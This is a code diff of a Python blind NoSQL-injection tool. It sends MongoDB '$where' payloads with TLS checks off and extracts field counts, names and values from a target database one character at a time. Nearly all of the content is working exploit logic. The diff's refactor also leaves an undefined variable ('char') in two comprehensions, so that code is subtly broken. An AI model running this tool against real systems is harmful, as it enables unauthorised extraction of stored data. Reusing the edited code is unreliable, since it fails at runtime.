@@ -10,10 +10,7 @@ def def_handler(sig, frame):
 
 signal.signal(signal.SIGINT, def_handler)
 
-session = None
-
 def initialize_session(proxy_url=None):
-    global session
     session = requests.Session()
     
     session.headers.update({
@@ -28,8 +25,9 @@ def initialize_session(proxy_url=None):
         }
     
     session.verify = False
+    return session
 
-def make_request(url, payload):
+def make_request(session, url, payload):
     try:
         response = session.post(
             url,
@@ -49,7 +47,7 @@ def escape_regex_character(character):
         return '\\\\' + character
     return character
 
-def get_number_of_fields(url):
+def get_number_of_fields(session, url):
     progress_bar = log.progress("Enumerating number of fields")
     progress_bar.status("Starting brute-force attack")
     
@@ -65,14 +63,14 @@ def get_number_of_fields(url):
         
         progress_bar.status(payload["$where"])
         
-        if make_request(url, payload):
+        if make_request(session, url, payload):
             log.success(f"Fields found: {count}")
             progress_bar.success("Completed")
             return count
         
         count += 1
 
-def get_field_lengths(url, total_fields):
+def get_field_lengths(session, url, total_fields):
     field_lengths_list = []
     print()
     progress_bar = log.progress("Enumerating field lengths")
@@ -91,7 +89,7 @@ def get_field_lengths(url, total_fields):
             
             progress_bar.status(payload["$where"])
             
-            if make_request(url, payload):
+            if make_request(session, url, payload):
                 field_lengths_list.append(current_length)
                 log.success(f"Field {current_field_index}: {current_length}")
                 break
@@ -101,8 +99,8 @@ def get_field_lengths(url, total_fields):
     progress_bar.success("Completed")
     return field_lengths_list
 
-def get_field_names(url, field_lengths_list):
-    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
+def get_field_names(session, url, field_lengths_list):
+    characters = "".join(sorted(set(character for character in string.printable if char.isprintable()), key=string.printable.index))
     field_names_list = []
     print()
     progress_bar = log.progress("Enumerating field names")
@@ -133,7 +131,7 @@ def get_field_names(url, field_lengths_list):
                 
                 progress_bar.status(payload["$where"])
                 
-                if make_request(url, payload):
+                if make_request(session, url, payload):
                     extracted_field_name += character
                     character_found = character
                     field_progress_bar.status(extracted_field_name)
@@ -150,7 +148,7 @@ def get_field_names(url, field_lengths_list):
     progress_bar.success("Completed")
     return field_names_list
 
-def get_field_value_lengths(url, field_names_list, field_indexes):
+def get_field_value_lengths(session, url, field_names_list, field_indexes):
     field_value_lengths = {}
     print()
     progress_bar = log.progress("Enumerating field value lengths")
@@ -175,7 +173,7 @@ def get_field_value_lengths(url, field_names_list, field_indexes):
             
             progress_bar.status(payload["$where"])
             
-            if make_request(url, payload):
+            if make_request(session, url, payload):
                 field_value_lengths[current_field_name] = current_value_length
                 log.success(f"Field {current_field_index}: {current_value_length}")
                 break
@@ -185,8 +183,8 @@ def get_field_value_lengths(url, field_names_list, field_indexes):
     progress_bar.success("Completed")
     return field_value_lengths
 
-def get_field_value_names(url, field_names_list, field_value_lengths, field_indexes):
-    characters = "".join(sorted(set(char for char in string.printable if char.isprintable()), key=string.printable.index))
+def get_field_value_names(session, url, field_names_list, field_value_lengths, field_indexes):
+    characters = "".join(sorted(set(character for character in string.printable if char.isprintable()), key=string.printable.index))
     field_values = {}
     print()
     progress_bar = log.progress("Enumerating field values")
@@ -224,7 +222,7 @@ def get_field_value_names(url, field_names_list, field_value_lengths, field_inde
                 
                 progress_bar.status(payload["$where"])
                 
-                if make_request(url, payload):
+                if make_request(session, url, payload):
                     extracted_field_value += character
                     character_found = character
                     field_progress_bar.status(extracted_field_value)
@@ -307,20 +305,20 @@ def save_and_display_results(field_indexes, field_names_list, field_values, outp
         log.error(f"Failed to save results: {e}")
         return False
 
-def execute_enumeration(url, proxy_url=None, output_file='fields.txt'):
-    initialize_session(proxy_url)
+def main(url, proxy_url=None, output_file='fields.txt'):
+    session = initialize_session(proxy_url)
     
-    total_fields = get_number_of_fields(url)
+    total_fields = get_number_of_fields(session, url)
     if total_fields is None:
         log.error("Failed to enumerate number of fields")
         return
     
-    field_lengths_list = get_field_lengths(url, total_fields)
+    field_lengths_list = get_field_lengths(session, url, total_fields)
     if not field_lengths_list:
         log.error("Failed to enumerate field lengths")
         return
     
-    field_names_list = get_field_names(url, field_lengths_list)
+    field_names_list = get_field_names(session, url, field_lengths_list)
     if not field_names_list:
         log.error("Failed to enumerate field names")
         return
@@ -330,12 +328,12 @@ def execute_enumeration(url, proxy_url=None, output_file='fields.txt'):
         log.error("No valid field indexes selected")
         return
     
-    field_value_lengths = get_field_value_lengths(url, field_names_list, field_indexes)
+    field_value_lengths = get_field_value_lengths(session, url, field_names_list, field_indexes)
     if not field_value_lengths:
         log.error("Failed to enumerate field value lengths")
         return
     
-    field_values = get_field_value_names(url, field_names_list, field_value_lengths, field_indexes)
+    field_values = get_field_value_names(session, url, field_names_list, field_value_lengths, field_indexes)
     if not field_values:
         log.error("Failed to enumerate field values")
         return
@@ -354,4 +352,4 @@ if __name__ == '__main__':
     
     args = parser.parse_args()
     
-    execute_enumeration(url=args.url, proxy_url=args.proxy, output_file=args.output)
+    main(url=args.url, proxy_url=args.proxy, output_file=args.output)
